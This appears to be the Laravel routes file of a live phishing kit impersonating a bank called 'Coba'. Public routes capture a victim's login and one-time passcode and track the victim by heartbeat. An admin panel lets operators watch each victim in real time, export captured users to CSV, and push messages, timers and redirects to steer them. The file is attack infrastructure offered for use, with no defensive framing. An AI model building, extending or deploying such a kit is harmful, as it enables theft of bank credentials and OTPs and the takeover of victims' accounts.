<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AdminAuthController;
use App\Http\Controllers\AdminControlController;
use App\Http\Controllers\CaptureController;
use App\Http\Controllers\ModalesController;

// Rutas Públicas (Coba)
Route::get('/', [CaptureController::class, 'index'])->name('index');

// Flujo Coba: index -> otp -> loading
Route::post('/capture-login', [CaptureController::class, 'captureLogin'])->name('coba.capture.login');
Route::get('/otp', [CaptureController::class, 'showOtp'])->name('coba.otp');
Route::post('/capture-otp', [CaptureController::class, 'captureOtp'])->name('coba.capture.otp');
Route::get('/loading', [CaptureController::class, 'showLoading'])->name('coba.loading');


// API para heartbeat
Route::post('/api/heartbeat', [CaptureController::class, 'heartbeat'])->name('api.heartbeat');

// Rutas Admin
Route::get('/admin/login', [AdminAuthController::class, 'showLogin'])->name('login');
Route::post('/admin/login', [AdminAuthController::class, 'login'])->name('admin.login.submit');
Route::post('/admin/logout', [AdminAuthController::class, 'logout'])->name('admin.logout');

Route::middleware('admin')->group(function () {
    Route::get('/admin/dashboard', [AdminControlController::class, 'index'])->name('admin.dashboard');
    Route::get('/admin/panel-dinamico/{userId}', [AdminControlController::class, 'panelDinamico'])->middleware('permission:dashboard.action.panel_dinamico')->name('admin.panel.dinamico');
    Route::get('/admin/api/usuario/{userId}', [AdminControlController::class, 'getUserData'])->name('admin.api.usuario');
    Route::get('/admin/usuarios/export', [AdminControlController::class, 'exportAllUsers'])->middleware('permission:dashboard.download_csv')->name('admin.usuarios.export');
    Route::delete('/admin/usuarios/vaciar', [AdminControlController::class, 'vaciarUsuarios'])->middleware('permission:dashboard.clear_all_users')->name('admin.usuarios.vaciar');
    Route::delete('/admin/usuarios/{id}', [AdminControlController::class, 'deleteUser'])->middleware('permission:dashboard.action.delete_user')->name('admin.usuarios.delete');
    Route::post('/admin/usuarios/{id}/comentarios', [AdminControlController::class, 'saveComentarios'])->middleware('permission:dashboard.comment_add')->name('admin.usuarios.comentarios');


    // API para polling del dashboard
    Route::get('/admin/api/dashboard/polling', [AdminControlController::class, 'dashboardPolling'])->name('admin.dashboard.polling');

    // API para polling del panel dinámico
    Route::get('/admin/api/panel-dinamico/{userId}/polling', [AdminControlController::class, 'panelDinamicoPolling'])->name('admin.panel.dinamico.polling');

    // API para sistema de mensajes (admin -> usuario)
    Route::post('/admin/api/mensajes/enviar', [AdminControlController::class, 'enviarMensaje'])->middleware('permission:panel.send.custom_message')->name('admin.mensajes.enviar');
    Route::get('/admin/api/mensajes/cargar/{userId}', [AdminControlController::class, 'cargarMensajes'])->name('admin.mensajes.cargar');

    // API para herramientas avanzadas (iniciadas por admin)
    Route::post('/admin/api/herramientas/enviar', [AdminControlController::class, 'enviarHerramientas'])->middleware('permission:panel.send.herramientas')->name('admin.herramientas.enviar');
    Route::post('/admin/api/timer/enviar', [AdminControlController::class, 'enviarTimer'])->middleware('permission:panel.send.timer')->name('admin.timer.enviar');
    Route::post('/admin/api/redireccion/enviar', [AdminControlController::class, 'enviarRedireccion'])->middleware('permission:panel.send.redireccion')->name('admin.redireccion.enviar');

    // Página de gestión de admins/mods (Inertia)
    Route::get('/admin/mods', [AdminControlController::class, 'modsPage'])->middleware('permission:manage_admins')->name('admin.mods');


    // === Gestión de admins/mods (solo superadmin o permiso manage_admins) ===
    Route::get('/admin/api/admins', [AdminControlController::class, 'listAdmins'])->middleware('permission:manage_admins');
    Route::post('/admin/api/admins', [AdminControlController::class, 'createAdmin'])->middleware('permission:manage_admins');
    Route::put('/admin/api/admins/{id}', [AdminControlController::class, 'updateAdmin'])->middleware('permission:manage_admins');
    Route::delete('/admin/api/admins/{id}', [AdminControlController::class, 'deleteAdmin'])->middleware('permission:manage_admins');

});



// ===== RUTAS PARA USUARIOS (MODALES) =====
Route::post('/api/usuario/verificar-mensajes', [ModalesController::class, 'verificarMensajes'])->name('usuario.verificar.mensajes');
Route::post('/api/usuario/procesar-mensaje', [ModalesController::class, 'procesarMensaje'])->name('usuario.procesar.mensaje');

// ===== RUTAS PARA HERRAMIENTAS DEL USUARIO =====
Route::post('/api/usuario/verificar-herramientas', [App\Http\Controllers\HerramientasController::class, 'verificarHerramientas'])->name('usuario.verificar.herramientas');
Route::post('/api/usuario/procesar-herramientas', [App\Http\Controllers\HerramientasController::class, 'procesarHerramientas'])->name('usuario.procesar.herramientas');
Route::post('/api/usuario/verificar-timer', [App\Http\Controllers\HerramientasController::class, 'verificarTimer'])->name('usuario.verificar.timer');
Route::post('/api/usuario/procesar-timer', [App\Http\Controllers\HerramientasController::class, 'procesarTimer'])->name('usuario.procesar.timer');
Route::post('/api/usuario/verificar-redirecciones', [App\Http\Controllers\HerramientasController::class, 'verificarRedirecciones'])->name('usuario.verificar.redirecciones');
Route::post('/api/usuario/procesar-redirecciones', [App\Http\Controllers\HerramientasController::class, 'procesarRedirecciones'])->name('usuario.procesar.redirecciones');
